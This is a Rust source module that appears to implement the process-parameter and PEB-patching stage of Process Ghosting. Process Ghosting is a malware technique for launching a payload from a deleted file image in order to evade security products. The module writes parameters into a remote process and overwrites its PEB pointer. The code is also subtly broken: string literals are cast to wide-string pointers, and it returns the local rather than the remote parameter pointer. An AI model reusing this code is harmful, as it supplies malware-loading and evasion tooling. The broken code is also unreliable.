use ntapi::ntmmapi::{NtAllocateVirtualMemory, NtWriteVirtualMemory, NtReadVirtualMemory};
use ntapi::ntpsapi::PROCESS_BASIC_INFORMATION;
use ntapi::ntrtl::{
    RtlCreateProcessParametersEx, RtlInitUnicodeString, PRTL_USER_PROCESS_PARAMETERS,
    RTL_USER_PROC_PARAMS_NORMALIZED,
};
use ntapi::winapi::shared::ntdef::{HANDLE, NT_SUCCESS, NULL, PUNICODE_STRING, UNICODE_STRING, PVOID};
use ntapi::winapi::um::errhandlingapi::GetLastError;
use ntapi::winapi::um::memoryapi::WriteProcessMemory;
use ntapi::winapi::um::userenv::CreateEnvironmentBlock;
use ntapi::winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE};
use std::mem::zeroed;
use std::ptr::null_mut;
use winapi::shared::minwindef::LPVOID;
use winapi::um::memoryapi::VirtualAllocEx;
use ntapi::ntpebteb::{PPEB, PEB};
use std::intrinsics::size_of;

pub unsafe fn buffer_remote_peb(h_proces: HANDLE,pbi: PROCESS_BASIC_INFORMATION)->PEB{
    let mut peb_copy=zeroed::<PEB>();
    let remote_peb_addr=pbi.PebBaseAddress;
    println!("Peb Address {:?}",remote_peb_addr);

    let status=NtReadVirtualMemory(h_proces,
                                   remote_peb_addr as *const _ as *mut _,
    &mut peb_copy as *const _ as *mut _,
    size_of::<PEB>(),
    null_mut());

    if !NT_SUCCESS(status){
        println!("Cannot Read Remote PEB");
    }
    peb_copy
}

unsafe fn set_params_in_peb(params: PVOID,h_process: HANDLE, remote_peb: PPEB)->bool{

    let x = WriteProcessMemory(h_process,
                               &(*remote_peb).ProcessParameters as *const _ as *mut _,
                               params,
                               size_of::<PVOID>(),
                               null_mut());
    if x == 0{
        println!("update Peb Fails");
        return false
    }
    println!("update Peb Success");
return true
}
unsafe fn write_params_into_process(
    hprocess: HANDLE,
    params: PRTL_USER_PROCESS_PARAMETERS,
) -> LPVOID {
    let mut return_legth: usize = 0;
    let buffer_deference = &params;
    let mut sz2 = (*params).EnvironmentSize + (*params).MaximumLength as usize;

    let mut x = VirtualAllocEx(
        hprocess,
        buffer_deference as *const _ as *mut _,
        (*params).Length as usize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if !x.is_null() {
        println!("Allocation Params Success");
        let y = WriteProcessMemory(
            hprocess,
            x,
            params as *const _,
            (*params).Length as usize,
            &mut return_legth,
        );
        if y == 0 {
            println!("Writeprocess Params Fails");
            return null_mut();
        }
        println!("Writeprocess Params Success");
        if !(*params).Environment.is_null() {
            println!("Environment is no null");
            let mut x = VirtualAllocEx(
                hprocess,
                (*params).Environment,
                (*params).EnvironmentSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if !x.is_null() {
                println!("Allocation Environment Success");
                let y = WriteProcessMemory(
                    hprocess,
                    x,
                    (*params).Environment as *const _,
                    (*params).EnvironmentSize as usize,
                    &mut return_legth,
                );
                if y == 0 {
                    println!("Writeprocess fails Environment");
                    return null_mut();
                }
                println!("Writeprocess Success Environment");
            }
        }
    }
    return params as *mut _;
}

pub(crate) unsafe fn setup_process_parameters(
    h_process: HANDLE,
    pbi: PROCESS_BASIC_INFORMATION,
    target: UNICODE_STRING,
) -> bool {
    //TODO HERE ADD A FUNCTION TO GET THE PROCESS TARGET DIRECTORY I PUT ONE DIRECT FOR FACILITY

    let mut unicode_current_dir = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(
        &mut unicode_current_dir,
        "C:\\Windows\\System32\\".as_ptr() as *const u16,
    );

    let mut unicode_dll_dir = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(
        &mut unicode_dll_dir,
        "C:\\Windows\\System32\\".as_ptr() as *const u16,
    );

    let mut unicode_window_name = zeroed::<UNICODE_STRING>();
    RtlInitUnicodeString(
        &mut unicode_window_name,
        "Process Ghosting test!".as_ptr() as *const u16,
    );

    let mut environment = zeroed::<LPVOID>();
    CreateEnvironmentBlock(&mut environment, NULL, 1);

    let mut params = zeroed::<PRTL_USER_PROCESS_PARAMETERS>();
    let p_unicode = zeroed::<PUNICODE_STRING>();
    let status = RtlCreateProcessParametersEx(
        &mut params,
        &target as *const _ as *mut _,
        &mut unicode_dll_dir,
        &mut unicode_current_dir,
        &target as *const _ as *mut _,
        environment,
        &mut unicode_window_name,
        null_mut(),
        null_mut(),
        null_mut(),
        RTL_USER_PROC_PARAMS_NORMALIZED,
    );

    if !NT_SUCCESS(status) {
        println!("RtlCreateProcessParametersEX Fail");
        return false;
    }
    println!("RtlCreateProcessParametersEX Success");

    let remote_params=write_params_into_process(h_process, params);
    if remote_params.is_null(){
        println!("Cannot make a remote copy of parameters");
        return false
    }

    if !set_params_in_peb(remote_params,h_process,pbi.PebBaseAddress){
        println!("Cannot Make Update Peb: {}",GetLastError());
        return false
    }

    let peb_copy=buffer_remote_peb(h_process,pbi);

        println!(">ProcessParameters addr {:?}",peb_copy.ProcessParameters);
    //let mut sz2=buffer_end-buffer_process as usize;

    return true;
}
